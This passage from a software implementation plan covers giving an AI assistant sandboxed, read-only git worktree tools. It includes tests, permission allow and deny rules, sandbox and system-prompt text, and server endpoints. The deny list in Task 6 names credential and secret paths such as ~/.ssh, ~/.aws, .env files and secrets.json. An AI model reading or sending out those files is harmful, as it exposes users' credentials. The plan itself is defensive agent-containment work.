      const emptyOk = r.code === 1 && !((r.stderr || '').trim()) && (v.args[0] === 'grep' || v.args[0] === 'diff');
      if (!r.ok && !emptyOk) throw new AskToolError(`git: ${deps.redact((r.stderr || '').trim() || `exited ${r.code}`)}`);
      let body = r.stdout;
      const hasPatch = /(^|\n)diff --git /.test(body);
      // `show` that produced no patch resolved to a BLOB/tree, not a commit — that is
      // the raw-file read we route through checkout+Read (and it closes the
      // ls-tree -> blob-sha -> `show <sha>` leg, which protectedInArgs cannot see).
      if (v.args[0] === 'show' && !hasPatch) {
        throw new AskToolError('git show displays commits — to read a file, check out the ref and Read it');
      }
      if (hasPatch) {
        // Protected-path section filter over ANY patch output (diff, show <commit>,
        // log -p). A header-LESS section (a commit-message preamble) is kept because
        // a real header is present; a section whose header opened but whose path is
        // protected on either side is dropped. A colour-escaped or external-diff dump
        // has no parseable header, so `hasPatch` is false and it never reaches here.
        const protectedSide = (p) => !!p && isProtectedBasename(p, deps.protectedPaths);
        body = splitUnifiedDiff(body)
          .filter((s) => s.member || !s.header || (!!s.path && !protectedSide(s.path) && !protectedSide(s.oldPath)))
          .map((s) => s.text).join('');
      } else if (LIST_SUBS.has(v.args[0])) {
        // grep/ls-files/ls-tree emit PATH LISTS, not diffs — the section filter would
        // drop ALL output. Drop any LINE that names a protected path (an unscoped
        // `git grep` can still hit .env; ls-* enumerate it). Token-scan handles both
        // leading-path (grep `path:line:text`, ls-files) and trailing-path (ls-tree
        // `<mode> blob <sha>\t<path>`) formats.
        body = body.split('\n')
          .filter((line) => !line || !line.split(/[\s:]+/).some((tok) => isProtectedBasename(tok, deps.protectedPaths)))
          .join('\n');
      }
      const offset = clampInt(input.offset, 0, Number.MAX_SAFE_INTEGER, 0);
      const maxBytes = clampInt(input.maxBytes, 1, L.gitOutputMaxBytes, L.diffDefaultBytes);
      return { command: ['git', ...v.args].join(' '), ...sliceBytes(deps.redact(body), offset, maxBytes) };
    },
```

   Also update the module header comment: the "No imports at all" line becomes "No imports beyond value-only siblings" if you import anything — but as written above NOTHING new is imported into `tools.mjs` (`validateGitArgs` arrives through deps), so leave the header alone.

3. `src/core/ask/mcp-stdio.mjs` — wire the bundle:

```js
import { defaultToolDeps } from './tool-deps.mjs';
import { defaultWorktreeDeps } from './worktree-deps.mjs';
```
and in `main()`:
```js
  const server = createRpcServer({
    tools: createAskTools({ ...defaultToolDeps({ threadId }), ...defaultWorktreeDeps({ threadId }) }),
    write: (s) => stdout.write(s),
  });
```

4. `test/ask-tools.test.mjs:58` — the exact-shape assertion gains the new field:

```js
  assert.deepEqual(splitUnifiedDiff('just text\n'), [{ path: null, oldPath: null, projectKey: null, member: false, header: false, added: 0, removed: 0, text: 'just text\n' }]);
```

5. **Two tool-NAME inventory pins break (the v1 plan wrongly predicted they pass).** Both `deepEqual` the 7-name list; the four new tools break them:
   - `test/ask-tools.test.mjs:365` — the `test('list(): seven tools with JSON-Schema inputs')` array. Extend it AND rename the test to `'eleven tools'`.
   - `test/ask-mcp-stdio.test.mjs:139` — spawns the REAL child (which now wires `defaultWorktreeDeps`), so it CANNOT "still pass". Extend its `msgs[1].result.tools.map(t => t.name)` array.

   Both become:
```js
['list_projects', 'list_workflows', 'list_runs', 'get_run', 'get_run_diff', 'propose_run', 'read_attachment',
 'open_worktree', 'list_worktrees', 'remove_worktree', 'git']
```

- [ ] **Step 4: Run tests**

Run: `node --test test/ask-worktree-tools.test.mjs test/ask-tools.test.mjs test/ask-mcp-stdio.test.mjs 2>&1 | tail -3`
Expected: PASS all three — but ONLY after the two tool-name pins in Step 3, item 5 are updated. `test/ask-mcp-stdio.test.mjs` spawns the real child, which now returns 11 tools, so the v1 claim that it "still passes" untouched is WRONG; its `tools/list` name array must be extended.

- [ ] **Step 5: Commit**

```bash
git add src/core/ask/worktree-deps.mjs src/core/ask/tools.mjs src/core/ask/mcp-stdio.mjs \
  test/ask-worktree-tools.test.mjs test/ask-tools.test.mjs test/ask-mcp-stdio.test.mjs
git commit -m "worca: Ask Worca Worktrees — MCP tools (open/list/remove/git)"
```

---

### Task 6: Permissions, prompt rules, docs

**Files:**
- Modify: `src/core/ask/spawn.mjs` (ASK_BUILTIN_TOOLS :21, ASK_DENY_RULES :23-31, SANDBOX_NOTE :33-36, `buildAskSpawnOptions` permissionRules :67; new export `askWorktreeAllowRules`)
- Modify: `src/core/ask/prompt.mjs` (`ASK_SYSTEM_RULES` :12-22)
- Modify: `docs/guardrails.md` (Ask Worca sandbox section :118-147), `docs/storage.md` (layout block :11-30)
- Test: `test/ask-spawn.test.mjs` (update pins), `test/ask-prompt.test.mjs` (extend if it pins rule text)

**Interfaces:**
- Consumes: the Task 0 `GATE E1` verdict.
- Produces: `askWorktreeAllowRules(threadId) → string[]`; spawn options now carry `tools/allowedTools = ['Task','Read','Grep','Glob']` (per E1) and `permissionRules: {allow, deny}`.

- [ ] **Step 1: Update the pinned tests FIRST** (they are the spec of this task)

In `test/ask-spawn.test.mjs` (the v1 list was incomplete — ALL of these break, and the file must gain a `node:fs` import):

- `import { readFileSync, readdirSync } from 'node:fs';` — the new SOURCE-derived deny-pin test uses both; the file imports neither today.
- Import `askWorktreeAllowRules` and `ASK_BUILTIN_TOOLS` from spawn.mjs.
- The recipe test: `assert.deepEqual(o.allowedTools, ['Task', 'Read', 'Grep', 'Glob']);` and same for `o.tools`; the per-tool negative loop at `:57` becomes `['Bash', 'Write', 'Edit', 'NotebookEdit']` (it REPLACES `'Read'` and ADDS `'NotebookEdit'` — not a pure shrink).
- **`:64` — the exact-shape `permissionRules` assertion breaks** the moment `allow` is added: `assert.deepEqual(o.permissionRules, { allow: askWorktreeAllowRules('ask_00000001'), deny: [...ASK_DENY_RULES] });`
- **`:45` — `assert.deepEqual(o.envAllowlist, ['SSH_AUTH_SOCK']);`** (was `[]`).
- **The `buildClaudeArgs` argv pins at `:98`/`:99` and the fake-bin pins at `:127`/`:133`**: `--allowedTools` → `'Task,Read,Grep,Glob,mcp__worca'`, `--tools` → `'Task,Read,Grep,Glob'`. (`test/ask-runner-options.test.mjs:121` also contains `'Task,mcp__worca'` but builds its own literal options and is UNAFFECTED — verified empirically; leave it, and `test/ask-turn.test.mjs:381` too, which pins the separate title spawn.)
- The deny test's expected list becomes:

```js
  assert.deepEqual(ASK_DENY_RULES, [
    'Bash', 'Edit', 'Write', 'NotebookEdit', 'WebFetch', 'WebSearch', 'Skill',
    'Read(//**/.worca-cc/store/**)',
    'Read(//**/.worca-cc/runs/**)',
    'Read(//**/.worca-cc/plugins/**)',
    'Read(//**/.worca-cc/agents/**)',
    'Read(//**/.worca-cc/workflows/**)',
    'Read(//**/.worca-cc/backup-*/**)',
    'Read(//**/.worca-cc/tmp/**)',
    'Read(//**/.worca-cc/ask/*/att/**)',
    'Read(//**/.worca-cc/settings.json)',
    'Read(//**/.worca-cc/projects.json)',
    'Read(//**/.worca-cc/workspaces.json)',
    'Read(//**/.worca-cc/chat-context.json)',
    'Read(//**/worca-cc.db*)',
    'Read(//**/secrets.json)',
    'Read(//**/.env*)',
    'Read(~/.ssh/**)',
    'Read(~/.aws/**)',
  ]);
```

- New tests:

```js
test('allow rules: one per tool family, thread-scoped, shape-checked, anchored', () => {
  const o = buildAskSpawnOptions(base());
  assert.deepEqual(o.permissionRules.allow, askWorktreeAllowRules('ask_00000001'));
  assert.deepEqual(askWorktreeAllowRules('ask_00000001'), [
    'Read(//**/.worca-cc/ask/ask_00000001/wt/**)',
  ]);
  assert.deepEqual(askWorktreeAllowRules('../etc'), [], 'unminted id ⇒ NO allow rule (never interpolated)');
  assert.deepEqual(askWorktreeAllowRules(undefined), []);
  for (const rule of o.permissionRules.allow) {
    assert.ok(/^\w+\(\/\//.test(rule), `${rule} is //-anchored`);
    assert.ok(!rule.includes(FAKE_HOME), 'never interpolates the resolved home');
  }
});

test('deny pin: every worcaHome() child is denied or is the ask/ subtree (SOURCE-derived)', () => {
  // The fixture is the CODE, not a hand-list the same commit writes — otherwise the
  // pin is circular (M6.13: adding a new home subdir with no deny passed silently).
  // Scan ALL of src/core (recursively — the writers are spread across store.mjs,
  // plugins-lock.mjs, orchestrator.mjs, agent-gen.mjs, chat/chat-context.mjs, … so a
  // hardcoded module list misses some) for `join(worcaHome(), 'X')`; every X (except
  // ask) must have a deny rule.
  const denyText = ASK_DENY_RULES.join('\n');
  const dir = new URL('../src/core/', import.meta.url);
  const src = readdirSync(dir, { recursive: true })
    .filter((f) => String(f).endsWith('.mjs'))
    .map((f) => readFileSync(new URL(String(f), dir), 'utf8'))
    .join('\n');
  const children = new Set([...src.matchAll(/join\(\s*worcaHome\(\)\s*,\s*'([^'/]+)'/g)].map((m) => m[1]));
  assert.ok(children.size >= 8, `sanity: found the worcaHome() children — ${[...children].join(', ')}`);
  for (const c of children) {
    if (c === 'ask') continue;                                  // att/ denied, wt/ allowed
    // A rule may be `/X/**` OR `/X*` (worca-cc.db*), so match the bare prefix `/X`.
    assert.ok(denyText.includes(`/${c}`), `worcaHome()/${c} is reachable and has NO deny rule — dissolving the blanket deny exposed it`);
  }
});

test('settings payload carries allow AND deny through buildClaudeArgs', () => {
  const args = buildClaudeArgs(buildAskSpawnOptions(base()));
  const settings = JSON.parse(args[args.indexOf('--settings') + 1]);
  assert.deepEqual(settings.permissions.deny, [...ASK_DENY_RULES]);
  assert.deepEqual(settings.permissions.allow, ['Read(//**/.worca-cc/ask/ask_00000001/wt/**)']);
  assert.equal(args[args.indexOf('--tools') + 1], 'Task,Read,Grep,Glob');
  assert.equal(args[args.indexOf('--allowedTools') + 1], 'Task,Read,Grep,Glob,mcp__worca');
});
```

**Gate E1 adjustments** (the Task-0 verdict drives the tool set — everything above assumes `PASS`):
- `GREP-RULED`: `askWorktreeAllowRules` returns the Read rule plus `Grep(...)`/`Glob(...)` twins, and ASK_DENY_RULES gains Grep AND Glob twins of every Read path rule (a Glob of `store/**` still leaks filenames) — mirror that in both new tests.
- `READ-ONLY`: tools lists are `['Task','Read']` everywhere above; `SANDBOX_NOTE` and prompt rule 7 must NOT name Grep/Glob (reword to "Read inside your worktrees; use `git grep`/`git ls-files` to search"), and the model's only search path is the hardened `git grep` — so the Task 5 redaction hardening is load-bearing.
- `READ-ONLY-STRICT` (symlink/`..` escaped in the extended probe): tools list is `['Task']` only — DROP Read/Grep/Glob and the allow rule entirely; `askWorktreeAllowRules` returns `[]`, `SANDBOX_NOTE`/rule 7 say file access is only via the `git` tool (and an optional server-side `read_worktree` MCP tool that realpaths + asserts containment). The deny-list restructure is then unnecessary (no native Read to scope) — keep the blanket `Read(//**/.worca-cc/**)` deny and skip the enumerated-denies half of this task.

Also add `'SSH_AUTH_SOCK'` to the spawn options: in `buildAskSpawnOptions` change `envAllowlist: []` to `envAllowlist: ['SSH_AUTH_SOCK']` (spec §12 E3 default: fetch credentials for ssh remotes; push stays blocked at the tool layer) and update the recipe test's `assert.deepEqual(o.envAllowlist, ['SSH_AUTH_SOCK'])`.

- [ ] **Step 2: Run to verify failure**

Run: `node --test test/ask-spawn.test.mjs 2>&1 | tail -5`
Expected: FAIL — but NOT "on the new pins" as such; because `askWorktreeAllowRules` does not exist yet, the import is a module-level `SyntaxError: … does not provide an export named 'askWorktreeAllowRules'` and EVERY test in the file fails to load. Once the impl lands, the individual pins are what keep it honest.

- [ ] **Step 3: Implement spawn.mjs**

```js
export const ASK_BUILTIN_TOOLS = Object.freeze(['Task', 'Read', 'Grep', 'Glob']);
```

```js
// P4: the blanket `Read(//**/.worca-cc/**)` became ENUMERATED denies so the one
// allow rule below can open ask/<thread>/wt/**. Deny beats allow, so the blanket
// form would swallow the worktrees. This list MUST cover every top-level
// worcaHome() child except the ask/ subtree, or dissolving the blanket deny is a
// NET SECURITY REGRESSION (agents/, workflows/, projects.json, workspaces.json,
// chat-context.json were newly readable without their entries here). The Step-1
// SOURCE-DERIVED pin test enforces this by grepping join(worcaHome(),'X') out of
// src/core/*.mjs — do NOT claim the doc-layout pin catches it (it does not).
export const ASK_DENY_RULES = Object.freeze([
  'Bash', 'Edit', 'Write', 'NotebookEdit', 'WebFetch', 'WebSearch', 'Skill',
  'Read(//**/.worca-cc/store/**)',
  'Read(//**/.worca-cc/runs/**)',
  'Read(//**/.worca-cc/plugins/**)',
  'Read(//**/.worca-cc/agents/**)',
  'Read(//**/.worca-cc/workflows/**)',
  'Read(//**/.worca-cc/backup-*/**)',
  'Read(//**/.worca-cc/tmp/**)',
  'Read(//**/.worca-cc/ask/*/att/**)',       // attachments only via the scoped MCP tool
  'Read(//**/.worca-cc/settings.json)',
  'Read(//**/.worca-cc/projects.json)',
  'Read(//**/.worca-cc/workspaces.json)',
  'Read(//**/.worca-cc/chat-context.json)',
  'Read(//**/worca-cc.db*)',
  'Read(//**/secrets.json)',
  'Read(//**/.env*)',
  'Read(~/.ssh/**)',
  'Read(~/.aws/**)',
]);

/**
 * The per-thread allow rules (P4 §6): ONE Read rule spans every worktree of the
 * thread, present and future. The thread id is the only value ever interpolated
 * into a permission rule, so it is shape-checked here — an unminted id yields
 * NO allow rule rather than a corrupt glob.
 */
export function askWorktreeAllowRules(threadId) {
  if (typeof threadId !== 'string' || !/^ask_[0-9a-f]{8}$/.test(threadId)) return [];
  return [`Read(//**/.worca-cc/ask/${threadId}/wt/**)`];
}
```

In `buildAskSpawnOptions`: `permissionRules: { allow: askWorktreeAllowRules(thread.id), deny: [...ASK_DENY_RULES] },` and `envAllowlist: ['SSH_AUTH_SOCK'],`.

New `SANDBOX_NOTE`:

```js
export const SANDBOX_NOTE =
  "You are a sub-agent of Worca's assistant and run in the same sandbox: your tools are Task, the worca MCP tools " +
  "(mcp__worca__*), and Read/Grep/Glob — which can see ONLY this chat's worktrees under .worca-cc/ask/<thread>/wt/. " +
  'You cannot edit files, run shell commands or use the network — do not try. ' +
  'Answer from tool results only; never invent run data; return a short report.';
```

- [ ] **Step 4: Extend `ASK_SYSTEM_RULES`** in `src/core/ask/prompt.mjs` — update rule 1's tool enumeration and append rules 7-8:

```js
  '1. Answer only from the worca tools (list_projects, list_workflows, list_runs, get_run, get_run_diff, read_attachment, open_worktree, list_worktrees, remove_worktree, git) plus Read/Grep/Glob inside your worktrees, and the catalog below. Never invent run ids, titles, diffs, costs or dates. If a diff is unavailable (archived run), say so.',
```
(replacing the existing rule 1 line) and after rule 6:
```js
  '7. Worktrees: open_worktree gives you a read-only DETACHED checkout of any project ref (or a run\'s branch via runId) — the ONLY place Read/Grep/Glob can see. Prefer reusing one (list_worktrees) over opening more (they are capped); remove_worktree when done. The git tool runs read-only git there (diff/log/show/blame/grep/…); to read a file\'s contents, checkout the ref and Read it (cat-file and show <rev>:<path> are unavailable). checkout/switch always re-detach; fetch refreshes origin/* in the project\'s shared object store — identical to you running fetch yourself, and nothing else you can run mutates the repository; push, pull and commits are impossible.',
  '8. Never edit code anywhere. When a change is needed, propose it with propose_run and describe exactly what the run should do.',
```
`test/ask-prompt.test.mjs` has NO rule-text pins today (`:37` is `startsWith`, `:94` counts `[worca context]`), so the entire new prompt/tool-enumeration half of this task is UNTESTED (rules 7-8, the rule-1 tool list, and the rewritten `SANDBOX_NOTE` all survived deletion in the dry-run). Add substring pins so a future edit cannot silently drop them:
```js
test('P4: the prompt advertises the worktree tools and the sandbox note names the file tools', () => {
  assert.ok(ASK_SYSTEM_RULES.includes('open_worktree'));
  assert.ok(ASK_SYSTEM_RULES.includes('propose_run'));
  assert.ok(ASK_SYSTEM_RULES.includes('cat-file'));                 // the "read a file by checkout" guidance
  assert.ok(SANDBOX_NOTE.includes('worktree'));                     // adapt to the E1 verdict wording
});
```
(Import `SANDBOX_NOTE` from spawn.mjs if the test does not already; under a non-PASS E1 verdict, weaken the `SANDBOX_NOTE` assertion to whatever the reworded text says.)

- [ ] **Step 5: Update the docs**

`docs/storage.md` layout block — it currently documents neither `runs/` nor `plugins/` nor the JSON registries; add the previously-undocumented children (keep the existing style), so the layout and the source-derived deny pin stay consistent:

```
  runs/<pipelineId>/                    detached run roots: run.json, repos/<projectKey>/ worktrees
  plugins/                              installed plugin checkouts
  agents/                               installed agent registry checkouts
  workflows/                            saved workflow templates
  projects.json                         registered project index
  workspaces.json                       workspace index
  chat-context.json                     chat context cache
```
and extend the `ask/<threadId>/` entry:
```
  ask/<threadId>/att/<attachmentId>.txt  Ask Worca attachment bodies …(existing text)…
  ask/<threadId>/wt/<worktreeId>/       Ask Worca chat worktrees: read-only DETACHED git
                                        checkouts the assistant opens (registry: ask_worktrees;
                                        removed with the thread, reconciled at boot)
```

`docs/guardrails.md` Ask Worca sandbox bullet — rewrite the tool/deny sentences to the new model: built-ins are `Task,Read,Grep,Glob`; Read/Grep/Glob are usable ONLY inside `<worcaHome>/ask/<threadId>/wt/**` via a per-thread allow rule; the blanket home deny became enumerated denies (list them) with a pin test; the worktree tools (`open_worktree`/`list_worktrees`/`remove_worktree`/`git`) are thread-scoped, detached-only, allowlisted (no push/pull/commit/config, fetch = configured remotes only), diff/show output passes the same protected-path floor + redaction as `get_run_diff`; `SSH_AUTH_SOCK` is allowlisted into the child for fetch.

- [ ] **Step 6: Run tests**

Run: `node --test test/ask-spawn.test.mjs test/ask-prompt.test.mjs test/ask-runner-options.test.mjs 2>&1 | tail -3`
Expected: PASS. The empirically-confirmed set of affected pins is entirely inside `test/ask-spawn.test.mjs` (Step 1); `test/ask-runner-options.test.mjs` and `test/ask-turn.test.mjs:381` build their own literal option objects and are UNAFFECTED. Still run `grep -rn "'--tools', 'Task'\|Task,mcp__worca" test/` as a backstop, and if it unexpectedly touches a file NOT already in Step 7's `git add`, stage it too (the commit must include every file changed).

- [ ] **Step 7: Commit**

```bash
git add src/core/ask/spawn.mjs src/core/ask/prompt.mjs docs/guardrails.md docs/storage.md test/ask-spawn.test.mjs test/ask-prompt.test.mjs
git commit -m "worca: Ask Worca Worktrees — Read/Grep/Glob grant + enumerated denies + prompt rules"
```

---

### Task 7: Server — cascade, snapshot, delete endpoint, list counts

**Files:**
- Modify: `ui/server.mjs` (ask imports block :38-61, GET thread :3073-3090, DELETE thread :3110-3135, new endpoint after :3135), `src/core/ask/store.mjs` (`listThreads` :82-90)
- Test: `test/ask-api-worktrees.test.mjs` (create), `test/ask-api-threads.test.mjs` (GET-snapshot key pin at :78 gains `worktrees`)

**Interfaces:**
- Consumes: Task 4 exports.
- Produces: `GET /api/ask/threads/:id` → `{…, worktrees: [...]}`; `DELETE /api/ask/threads/:id/worktrees/:wtId` → `{ok, steps}` | 400 | 404; thread rows from `GET /api/ask/threads` gain `worktrees: <count>`; `DELETE /api/ask/threads/:id` removes checkouts git-properly.

- [ ] **Step 1: Write the failing tests**

```js
// test/ask-api-worktrees.test.mjs
// P4/T7: worktrees over the HTTP surface — snapshot field, manual delete
// endpoint, thread-delete cascade leaving git clean. Boot recipe from
// ask-api-threads.test.mjs (temp home BEFORE the dynamic import).
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, rm, writeFile } from 'node:fs/promises';
import { existsSync } from 'node:fs';
import { spawnSync } from 'node:child_process';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { useTempHome } from './helpers/temp-home.mjs';

useTempHome(after);

let homeDir, repoDir, srv, base, prevHome, projectKey, threadId, wt;

before(async () => {
  homeDir = await mkdtemp(join(tmpdir(), 'worca-cc-askwt-'));
  repoDir = await mkdtemp(join(tmpdir(), 'worca-cc-askwt-repo-'));
  const g = (args) => spawnSync('git', args, { cwd: repoDir });
  g(['init', '-q', '-b', 'main']);
  g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  await writeFile(join(repoDir, 'README.md'), '# hi\n');
  g(['add', '-A']); g(['commit', '-qm', 'init']);
  prevHome = process.env.WORCA_HOME;
  process.env.WORCA_HOME = homeDir;
  process.env.WORCA_MOCK = '1';
  const mod = await import('../ui/server.mjs');
  srv = mod.server;
  await new Promise((r) => srv.listen(0, '127.0.0.1', r));
  base = `http://127.0.0.1:${srv.address().port}`;
  const { addProject } = await import('../src/core/projects.mjs');
  // addProject returns the whole project ARRAY, not the row — pick the entry.
  projectKey = (await addProject({ name: 'askwt', path: repoDir })).find((x) => x.name === 'askwt').key;
});

after(async () => {
  if (srv) await Promise.race([
    new Promise((r) => { srv.close(r); srv.closeAllConnections?.(); }),
    new Promise((r) => { const t = setTimeout(r, 500); t.unref?.(); }),
  ]);
  if (prevHome === undefined) delete process.env.WORCA_HOME; else process.env.WORCA_HOME = prevHome;
  delete process.env.WORCA_MOCK;
  await rm(homeDir, { recursive: true, force: true });
  await rm(repoDir, { recursive: true, force: true });
});

test('snapshot carries worktrees; list rows carry the count', async () => {
  const { thread } = await (await fetch(`${base}/api/ask/threads`, { method: 'POST',
    headers: { 'Content-Type': 'application/json' }, body: '{}' })).json();
  threadId = thread.id;
  const { openAskWorktree } = await import('../src/core/ask/worktrees.mjs');
  wt = await openAskWorktree({ threadId, projectKey, ref: 'main' });
  const snap = await (await fetch(`${base}/api/ask/threads/${threadId}`)).json();
  assert.deepEqual(Object.keys(snap).sort(), ['attachments', 'inFlight', 'messages', 'runLinks', 'thread', 'worktrees']);
  assert.equal(snap.worktrees.length, 1);
  assert.equal(snap.worktrees[0].worktreeId, wt.worktreeId);
  assert.equal(snap.worktrees[0].ref, 'main');
  // narrow envelope (same as list_worktrees) — NOT the full row (no threadId/projectDir/updatedAt):
  assert.deepEqual(Object.keys(snap.worktrees[0]).sort(), ['commit', 'createdAt', 'path', 'projectKey', 'ref', 'worktreeId']);
  const list = await (await fetch(`${base}/api/ask/threads`)).json();
  assert.equal(list.threads.find((t) => t.id === threadId).worktrees, 1);
});

test('DELETE worktree endpoint: 400 shape, 404 unknown, 200 removes disk + row', async () => {
  assert.equal((await fetch(`${base}/api/ask/threads/${threadId}/worktrees/bogus!`, { method: 'DELETE' })).status, 400);
  assert.equal((await fetch(`${base}/api/ask/threads/${threadId}/worktrees/wt_ffffffff`, { method: 'DELETE' })).status, 404);
  // Unknown THREAD → 404, and the BODY must say so: without asserting it, this case
  // is satisfied by the worktree-not-found branch too (the thread-existence guard
  // survived mutation). Pins that the thread is checked FIRST.
  const unknownThread = await fetch(`${base}/api/ask/threads/ask_ffffffff/worktrees/${wt.worktreeId}`, { method: 'DELETE' });
  assert.equal(unknownThread.status, 404);
  assert.equal((await unknownThread.json()).error, 'thread not found');
  const r = await fetch(`${base}/api/ask/threads/${threadId}/worktrees/${wt.worktreeId}`, { method: 'DELETE' });
  assert.equal(r.status, 200);
  assert.equal((await r.json()).ok, true);
  assert.ok(!existsSync(wt.path));
  const snap = await (await fetch(`${base}/api/ask/threads/${threadId}`)).json();
  assert.deepEqual(snap.worktrees, []);
});

test('thread DELETE removes remaining worktrees git-properly', async () => {
  const { openAskWorktree } = await import('../src/core/ask/worktrees.mjs');
  const w2 = await openAskWorktree({ threadId, projectKey, ref: 'main' });
  const r = await fetch(`${base}/api/ask/threads/${threadId}`, { method: 'DELETE' });
  assert.equal(r.status, 200);
  assert.ok(!existsSync(w2.path));
  const porcelain = String(spawnSync('git', ['worktree', 'list', '--porcelain'], { cwd: repoDir }).stdout);
  assert.ok(!porcelain.includes('/wt/'), 'no stale registration in the source repo');
});
```

Also in `test/ask-api-threads.test.mjs:78`, extend the snapshot key pin: `['attachments', 'inFlight', 'messages', 'runLinks', 'thread', 'worktrees']`.

- [ ] **Step 2: Run to verify failure**

Run: `node --test test/ask-api-worktrees.test.mjs 2>&1 | tail -3`
Expected: FAIL — snapshot has no `worktrees` key.

- [ ] **Step 3: Implement**

1. `ui/server.mjs` ask imports block — add:

```js
import {
  listAskWorktrees as askListWorktrees,
  removeAskWorktree as askRemoveWorktree,
  removeThreadWorktrees as askRemoveThreadWorktrees,
  sweepAskWorktrees,
} from '../src/core/ask/worktrees.mjs';
```

2. GET thread (response object opens at `:3080`, `runLinks` key at `:3084`): add `worktrees` after `runLinks`, projecting the SAME narrow shape the `list_worktrees` MCP tool returns (NOT the full row — `askListWorktrees` yields `threadId`/`projectDir`/`updatedAt` too, which the panel should not consume):

```js
    worktrees: askListWorktrees(id).map((w) => ({
      worktreeId: w.worktreeId, projectKey: w.projectKey, ref: w.ref,
      commit: w.commit, path: w.path, createdAt: w.createdAt,
    })),
```

3. DELETE thread — make the handler `async (req, res)` and insert between the follower detach and `askDeleteThread(id)`:

```js
    // P4 §5: git-proper removal of every worktree BEFORE the row cascade — the
    // rmSync inside askDeleteThread alone would leave stale `git worktree`
    // registrations in the source repos. Never throws (best-effort per row).
    await askRemoveThreadWorktrees(id);
```

4. New endpoint after the thread DELETE route:

```js
// P4 §10: manual worktree delete from the panel. Allowed while a turn is in
// flight — the model's next operation on it gets a clean tool error.
app.delete('/api/ask/threads/:id/worktrees/:wtId', async (req, res) => {
  const id = askIdParam(res, req.params.id, 'thread');
  if (!id) return;
  const wtId = askIdParam(res, req.params.wtId, 'worktree');
  if (!wtId) return;
  try {
    if (!askGetThread(id)) return res.status(404).json({ error: 'thread not found' });
    const out = await askRemoveWorktree({ threadId: id, wtId });
    res.json(out);
  } catch (err) {
    if (err && err.name === 'AskWorktreeError') return res.status(404).json({ error: err.message });
    res.status(500).json({ error: err && err.message ? err.message : String(err) });
  }
});
```
(Verify `askIdParam` accepts the `wt_` prefix — it validates against `ASK_ID_RE` = `/^[a-z]+_[0-9a-f]{8}$/`, which matches; the `'worktree'` label only feeds the 400 message.)

5. `src/core/ask/store.mjs` `listThreads` — add the count subquery beside `run_links`:

```js
    SELECT t.*, (SELECT count(*) FROM ask_run_links l WHERE l.thread_id = t.id) AS run_links,
           (SELECT count(*) FROM ask_worktrees w WHERE w.thread_id = t.id) AS worktrees
    FROM ask_threads t ORDER BY t.updated_at DESC, t.id LIMIT ?
```
and map it: `return rows.map((r) => ({ ...rowToThread(r), runLinks: r.run_links, worktrees: r.worktrees }));`

- [ ] **Step 4: Run tests**

Run: `node --test test/ask-api-worktrees.test.mjs test/ask-api-threads.test.mjs test/ask-store.test.mjs 2>&1 | tail -3`
Expected: PASS (if `ask-store.test.mjs` pins `listThreads` row keys, add `worktrees`).

- [ ] **Step 5: Commit**

```bash
git add ui/server.mjs src/core/ask/store.mjs test/ask-api-worktrees.test.mjs test/ask-api-threads.test.mjs test/ask-store.test.mjs
git commit -m "worca: Ask Worca Worktrees — server cascade + endpoints"
```

---

### Task 8: Boot sweep + doctor wiring

**Files:**
- Modify: `ui/server.mjs` (`bootMaintenance` :4254-4323 — the import landed in Task 7), `src/cli/worca-cc.mjs` (`cmdDoctor` :577-637)
- Test: `test/server-boot-sweeps.test.mjs` (extend)

**Interfaces:**
- Consumes: `sweepAskWorktrees` (Task 4).
- Produces: `bootMaintenance()` summary gains `askWorktrees: {removedDirs, prunedRows, failed}`; `worca doctor` prints an `ask worktrees:` line.

- [ ] **Step 1: Write the failing test** (append to `test/server-boot-sweeps.test.mjs`, following its existing harness — it imports `bootMaintenance` and asserts on the summary; mirror the setup its other tests use)

```js
test('bootMaintenance sweeps ask worktrees: orphan dir removed, stale row dropped, summary reported', async () => {
  const repo = await mkdtemp(join(tmpdir(), 'worca-cc-bswt-'));
  const g = (args) => spawnSync('git', args, { cwd: repo });
  g(['init', '-q', '-b', 'main']);
  g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  await writeFile(join(repo, 'README.md'), '# hi\n');
  g(['add', '-A']); g(['commit', '-qm', 'init']);
  const { addProject } = await import('../src/core/projects.mjs');
  const { createThread } = await import('../src/core/ask/store.mjs');
  const { openAskWorktree } = await import('../src/core/ask/worktrees.mjs');
  const { prepare } = await import('../src/core/db.mjs');
  const p = (await addProject({ name: 'bswt', path: repo })).find((x) => x.name === 'bswt');
  const t = createThread();
  const a = await openAskWorktree({ threadId: t.id, projectKey: p.key, ref: 'main' });
  const b = await openAskWorktree({ threadId: t.id, projectKey: p.key, ref: 'main' });
  rmSync(a.path, { recursive: true, force: true });          // stale row (dir gone)
  prepare('DELETE FROM ask_worktrees WHERE id = ?').run(b.worktreeId);  // orphan dir (row gone)
  const summary = await bootMaintenance({ log: () => {} });
  assert.equal(summary.askWorktrees.prunedRows, 1);
  assert.equal(summary.askWorktrees.removedDirs, 1);
  assert.equal(summary.askWorktrees.failed, 0);
  assert.ok(!existsSync(b.path));
  await rm(repo, { recursive: true, force: true });
});
```
Adapt the mechanics to this file's existing harness: it already imports `bootMaintenance` (lazily), `addProject`, `getDb`, `seedPipelineRow`, `existsSync`, `spawnSync`, `mkdtemp`/`rm`/`writeFile`/`realpath`, `tmpdir`, `join`, and has a realpath'd `freshRepo()` + `created[]` cleanup — reuse them. The ONLY missing imports are `rmSync` (from `node:fs`) and `prepare` (from `../src/core/db.mjs`, or use the `getDb().prepare` the test already reaches). Its summary local is named `res`, not `summary` — no key-set pin, so the addition is safe. If you want the sweep-ORDER guarantee (§13) covered, extend the file's EXISTING order test (`:79`, "run roots FIRST, then legacy") to also assert the `ask-worktrees` scope appears in the captured events after `legacy`, rather than adding a fragile new one.

- [ ] **Step 2: Run to verify failure**

Run: `node --test test/server-boot-sweeps.test.mjs 2>&1 | tail -3`
Expected: FAIL — `summary.askWorktrees` is undefined.

- [ ] **Step 3: Implement**

1. `bootMaintenance` — initialize `summary = { reconciled: 0, runRoots: null, legacy: null, ask: null, askWorktrees: null }` and add after the existing ask sweep block (before `return summary;`):

```js
  // Ask worktrees (P4 §5): reconcile ask_worktrees rows vs on-disk checkouts
  // both ways. Three-state inside the sweep: a DB failure aborts with nothing
  // removed.
  try {
    // Match the sibling sweeps EXACTLY (read how sweepRunRoots is invoked just above):
    // pass `sink('<scope>')` as the sweep's per-candidate `log` (so a test's `log: () => {}`
    // silences it, and a bare production boot — where `sink` returns undefined — falls
